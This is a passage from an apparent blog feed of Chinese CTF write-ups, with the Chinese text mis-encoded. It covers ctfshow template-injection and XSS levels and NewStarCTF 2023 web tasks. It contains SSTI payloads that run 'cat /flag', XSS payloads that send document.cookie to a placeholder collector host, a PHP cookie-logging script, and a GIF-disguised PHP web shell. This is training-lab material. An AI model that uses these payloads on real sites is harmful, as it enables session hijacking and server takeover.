class="hljs-name">request.cookies.b</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Cookies:a=__globals__;b=cat /flag</span><br></code></pre></td></tr></table></figure><h2 id="web367-â€“è¿‡æ»¤å•åŒå¼•å·ã€argsã€ä¸­æ‹¬å·-ã€ä¸‹åˆ’çº¿ã€os"><a href="#web367-â€“è¿‡æ»¤å•åŒå¼•å·ã€argsã€ä¸­æ‹¬å·-ã€ä¸‹åˆ’çº¿ã€os" class="headerlink" title="web367 â€“è¿‡æ»¤å•åŒå¼•å·ã€argsã€ä¸­æ‹¬å·[]ã€ä¸‹åˆ’çº¿ã€os"></a>web367 â€“è¿‡æ»¤å•åŒå¼•å·ã€argsã€ä¸­æ‹¬å·[]ã€ä¸‹åˆ’çº¿ã€os</h2><p>æµ‹è¯•å‘ç°è¿‡æ»¤osç»§ç»­ç”¨attræ–¹æ³•ç»•è¿‡</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.cookies.a</span>)).get(<span class="hljs-name">request.cookies.b</span>).popen(<span class="hljs-name">request.cookies.c</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">Cookie:a=__globals__;b=os;c=cat /flag</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/2023/10/20/xss/"/>
    <url>/2023/10/20/xss/</url>
    
    <content type="html"><![CDATA[<h1 id="xssæ¼æ´"><a href="#xssæ¼æ´" class="headerlink" title="xssæ¼æ´"></a>xssæ¼æ´</h1><p><a href="https://zhuanlan.zhihu.com/p/397940947">xssæ¼æ´åŸç†</a></p><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>æœ‰ä¸€ä¸ªè¾“å…¥æ¡†<br>è¾“å…¥ä¸€ä¸ªç®€å•çš„scriptä»£ç æµ‹è¯•ä¸€ä¸‹æ˜¯å¦æœ‰xssæ¼æ´</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hah&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆäº†ä¸€ä¸ªè­¦å‘Šæ¡†ï¼Œè¯´æ˜æœ‰xssæ¼æ´</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br>//flag=you<span class="hljs-meta">%20are</span><span class="hljs-meta">%20not</span><span class="hljs-meta">%20admin</span><span class="hljs-meta">%20no</span><span class="hljs-meta">%20flag</span><br></code></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯è‡ªå·±xäº†è‡ªå·±<br>ä¼ åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Š<br>è¿™æ˜¯æˆ‘æå‰å†™å¥½çš„b.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;/var/www/html/flag.txt&quot;</span>;<br><span class="hljs-variable">$data</span>=<span class="hljs-variable">$_GET</span>[a];<br><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-variable">$data</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>!==<span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cg&quot;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://ipipipip/b.php?a=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ åé¡µé¢è·³è½¬ï¼Œæ˜¾ç¤ºcgï¼Œè€Œæˆ‘ä»¬b.phpé‡Œcgä»£è¡¨ä¸Šä¼ æˆåŠŸ<br>è¿›å…¥flag.txtæŸ¥çœ‹å†™å…¥å†…å®¹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">PHPSESSID</span>=; <span class="hljs-attribute">flag</span>=ctfshow&#123;a6e4f621-36bf-442b-bcd4-c489b31f3696&#125;<br></code></pre></td></tr></table></figure><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>è¿™é¢˜è¿‡æ»¤äº†scriptå¤§å°å†™ï¼Œä½†æˆ‘ä»¬å¯ä»¥ç”¨img,inputç­‰ç­‰æ–¹æ³•<br>img</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">location.href</span>=<span class="hljs-string">&#x27;http://ipipip/b.php?a=&#x27;</span>+<span class="hljs-attr">document.cookie</span>&gt;</span><br></code></pre></td></tr></table></figure><p>input</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input onfocus<span class="hljs-operator">=</span><span class="hljs-string">&quot;window.open(&#x27;http://ipipip/b.php?a=&#x27;+document.cookie)&quot;</span> autofocus&gt;<br></code></pre></td></tr></table></figure><h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>å¢åŠ äº†å¯¹imgçš„è¿‡æ»¤ï¼Œä½†æ²¡è¿‡æ»¤iput</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input onfocus<span class="hljs-operator">=</span><span class="hljs-string">&quot;window.open(&#x27;http://ipipip/b.php?a=&#x27;+document.cookie)&quot;</span> autofocus&gt;<br></code></pre></td></tr></table></figure><h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><p>æ²¡æœ‰æµ‹è¯•è¿‡æ»¤äº†ä»€ä¹ˆï¼Œä½†inputä»ç„¶æœªè¢«è¿‡æ»¤ï¼Œç»§ç»­ä½¿ç”¨</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input onfocus<span class="hljs-operator">=</span><span class="hljs-string">&quot;window.open(&#x27;http://ippipi/b.php?a=&#x27;+document.cookie)&quot;</span> autofocus&gt;<br></code></pre></td></tr></table></figure><h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>æµ‹è¯•äº†å¾ˆå¤šæ ‡ç­¾ï¼Œä½†éƒ½æ²¡ç”¨<br>æœ¬é¢˜è¿‡æ»¤äº†ç©ºæ ¼,ç©ºæ ¼ç”¨%09ä»£æ›¿<br>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">?msg=&lt;iframe%09onload%3D<span class="hljs-string">&quot;alert(&#x27;ll&#x27;)&quot;</span>&gt;&lt;%2Fiframe&gt;<br><br>?msg=&lt;iframe%09onload%3D<span class="hljs-string">&quot;window.open(&#x27;http%3A%2F%2Fipipippip%2Fb.php%3Fa%3D&#x27;%2Bdocument.cookie)&quot;</span>&gt;&lt;%2Fiframe&gt;<br></code></pre></td></tr></table></figure><p>åœ¨urlä¸Šè¾“å…¥ï¼Œåœ¨æ¡†å†…è¾“å…¥ä¼šè¢«ç¼–ç </p><h2 id="web321-322"><a href="#web321-322" class="headerlink" title="web321-322"></a>web321-322</h2><p>åŒä¸Š</p><h2 id="web323-326"><a href="#web323-326" class="headerlink" title="web323-326"></a>web323-326</h2><p>è¿‡æ»¤äº†iframe<br>ç”¨body</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">&lt;<span class="hljs-keyword">body</span><span class="hljs-comment">/**/</span>onload=<span class="hljs-string">&quot;window.location.href=&#x27;http://ipipipip/b.php?a=&#x27;+document.cookie&quot;</span>&gt;&lt;/<span class="hljs-keyword">body</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>å­˜å‚¨å‹xss<br>å‘ä»¶äººéšæ„ï¼Œæ”¶ä»¶äººadminä¸ç„¶ä¼šå¤±è´¥<br>xä¿¡çš„å†…å®¹</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs d">&lt;<span class="hljs-keyword">body</span><span class="hljs-comment">/**/</span>onload=<span class="hljs-string">&quot;window.location.href=&#x27;http://ipipipip/b.php?a=&#x27;+document.cookie&quot;</span>&gt;&lt;/<span class="hljs-keyword">body</span>&gt;<br></code></pre></td></tr></table></figure><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>éšä¾¿ç¿»ç¿»ï¼Œç”¨æˆ·ç®¡ç†éœ€è¦adminæ‰èƒ½æŸ¥çœ‹è´¦æˆ·å¯†ç <br>å…ˆç‹ ç‹ çš„æ³¨å…¥<br>ç»è¿‡æµ‹è¯•ç”¨æˆ·åå’Œå¯†ç éƒ½å¯ä»¥è¾“å…¥xssä»£ç ï¼Œæ²¡æœ‰é™åˆ¶<br>ä»¥ç”¨æˆ·åä¸¾ä¾‹(ç»è¿‡æµ‹è¯•ï¼Œä¸‡èƒ½çš„bodyåœ¨è¿™é‡Œä¸èƒ½ç”¨ï¼Œåè€Œscriptå¯ä»¥ç”¨)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">userï¼š<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;http://ippiip/b.php?a=&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>password:123<br></code></pre></td></tr></table></figure><p>ç™»å½•æˆåŠŸåçœ‹çœ‹æˆ‘ä»¬çš„æœåŠ¡å™¨flag.txtæœ‰æ²¡æœ‰æ”¶åˆ°å†…å®¹<br>å¾—åˆ°äº†ä¸€ä¸ªPHPSESSIDï¼Œä½†æ²¡æœ‰flag<br>è¿™æ˜¯ç®¡ç†å‘˜cookie<br>æŠŠcookieæ”¹äº†ä¼ªé€ ä¸‹<br>å…ˆå‰ä¸æ˜¯è¯´åªæœ‰ç®¡ç†å‘˜æ‰èƒ½çœ‹ç”¨æˆ·å¯†ç å—<br>åˆ‡åˆ°ç”¨æˆ·ç®¡ç†é¡µé¢ï¼Œå‘ç°å†…å®¹è¿˜æ˜¯è¢«ä¸å¯è§ï¼Œä½†æˆ‘ä»¬ç¡®å®æ˜¾ç¤ºæ˜¯adminäº†<br>æŠ“ä¸ªåŒ…è¯•è¯•<br>ç¬¬ä¸€ä¸ªåŒ…æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘ä»¬åˆé¢å¤–æŠ“äº†ä¸€ä¸ªåŒ…<br><img src="/images/ZQ6Q0JO91I4YGN81IC.png"><br>é€šè¿‡å®ƒçš„getä¿¡æ¯<code>?page=1&amp;limit=10</code>çŸ¥é“äº†è¿™æ˜¯æŠ“åˆ°äº†è¡¨æ ¼çš„åŒ…<br>å®ƒçš„cookieè¿˜æ˜¯åŸæ¥è‡ªå·±çš„cookieï¼Œæˆ‘ä»¬å°†å®ƒæ”¹ä¸ºè·å–çš„ç®¡ç†å‘˜cookie<br>è¿”å›ç•Œé¢ï¼Œå†…å®¹ä¸å†è¢«é®æ©<br><img src="/images/QHMPBTJS5QF18MMCTA0.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>newstarctf 2023</title>
    <link href="/2023/10/16/newstarctf2023/"/>
    <url>/2023/10/16/newstarctf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h2><p>è¾“å…¥<code>www.zip</code>ä¸‹è½½<br>flagåœ¨index.phpå’Œrobots.txtä¸­<br>æ‹¼æ¥èµ·æ¥ä¸º<br>flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œæ²¡æœ‰è¿‡æ»¤<br>ä¸Šä¼ ä¸€ä¸ª1.png(å¯¹ä¸Šä¼ æœ‰ç­›æŸ¥ï¼Œåªå…è®¸pngï¼Œjpgç­‰ç­‰å›¾ç‰‡æ ¼å¼)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89A<br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æŠ“åŒ…ï¼ŒæŠŠåç¼€æ”¹ä¸º.php<br>ä¸Šä¼ åï¼Œé¡µé¢ç»™äº†ä¸€ä¸ªä¸Šä¼ çš„è·¯å¾„<br>&#x2F;upload&#x2F;1.php</p><p>payloadï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean">POST:<br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><span class="hljs-comment">//1.php</span><br><br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br><span class="hljs-comment">//bin boot dev etc fllll4g home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var </span><br><br>a=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /fllll4g&#x27;</span>);<br><span class="hljs-comment">//flag&#123;5c01bfc6-d871-4676-acb8-735946ea79c4&#125; </span><br></code></pre></td></tr></table></figure><h2 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h2><p>æŒ‰ç…§å®ƒçš„æ­¥éª¤æ¥<br>1.GET:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">Ctf</span>=123<br></code></pre></td></tr></table></figure><p>2.POST:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">secret=<span class="hljs-symbol">n3</span>wst<span class="hljs-number">4</span>rCTF<span class="hljs-number">2023</span><span class="hljs-name">g00000</span>d<br><span class="hljs-comment">//æŸ¥çœ‹æºä»£ç çŸ¥secret</span><br></code></pre></td></tr></table></figure><p>3.Cookie:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">power</span><span class="hljs-operator">=</span>ctfer<br></code></pre></td></tr></table></figure><p>4.User Agent:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">User</span>-Agent: NewStarCTF2023<br></code></pre></td></tr></table></figure><p>5.Referer:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Referer:</span> newstarctf.com<br></code></pre></td></tr></table></figure><p>6.<a href="https://blog.csdn.net/qq_43168364/article/details/108604163">ipä¼ªé€ </a>(å¸¸ç”¨çš„X-Forwarded-Foråœ¨è¿™é‡Œç”¨ä¸äº†)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">x</span>-real-ip: <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;d9378a7b-<span class="hljs-number">35</span>cb-<span class="hljs-number">4</span>a50-b743-<span class="hljs-number">163</span>b331f9da8&#125; <br></code></pre></td></tr></table></figure><h2 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h2><p>æŒ‰æç¤ºçš„æ¥ï¼Œå¦‚æœGETä¸¤ä¸ªå‚æ•°éƒ½ä¸ºæ•°å­—ï¼Œä¼šæ˜¾ç¤ºnot ssti,flag in source code~3<br>æµ‹è¯•å‡ æ¬¡å‘ç°codeåçš„æ•°å­—ä¸ºnumber1+number2ï¼ŒæŠŠå…¶ä¸­ä¸€ä¸ªæ”¹ä¸ºå­—ç¬¦è¯•ä¸€è¯•<br>GET</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">?<span class="hljs-symbol">number1</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-symbol">number2</span>=abc<br></code></pre></td></tr></table></figure><p>ValueErrorï¼Œå€’æ˜¯ç¬¦åˆé¢˜ç›®åç§°<br>åœ¨æŠ¥é”™ä¿¡æ¯ä¸­å¯»æ‰¾flag<br><img src="/images/Z3YAZODGO2MQO87TQZXDQ.png"><br>flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">Y0u_@</span>re_3enset1ve_4bout_deb8g&#125;<br></code></pre></td></tr></table></figure><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Level 1<br>MD5æ•°ç»„ç»•è¿‡</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">?key1<span class="hljs-comment">[]</span>=1&amp;key2<span class="hljs-comment">[]</span>=2<br></code></pre></td></tr></table></figure><p>Level 2<br>æ•°ç»„ç»•è¿‡</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">key3[]<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Level 3<br>strcmpå­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°ï¼Œä¸¤å­—ç¬¦ä¸²å®Œå…¨ç›¸åŒè¿”å›0ï¼Œä¸çŸ¥é“flagï¼Œæ‰€ä»¥ç”¨æ•°ç»„ç»•è¿‡NULL&#x3D;&#x3D;NULL</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">key4[]<span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>Level 4<br>is_numericè¿˜æ˜¯æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥åœ¨æœ€ååŠ å…¥å­—ç¬¦</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">key5[]<span class="hljs-operator">=</span><span class="hljs-number">2024</span><br>or<br><span class="hljs-attribute">key5</span><span class="hljs-operator">=</span><span class="hljs-number">2024</span>a<br>or<br><span class="hljs-attribute">key5</span><span class="hljs-operator">=</span><span class="hljs-number">2024</span>%<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>Level 5<br><code>extract($_POST)</code><br>å˜é‡è¦†ç›–æ‰€æœ‰postè¾“å…¥<br><code>foreach($_POST as 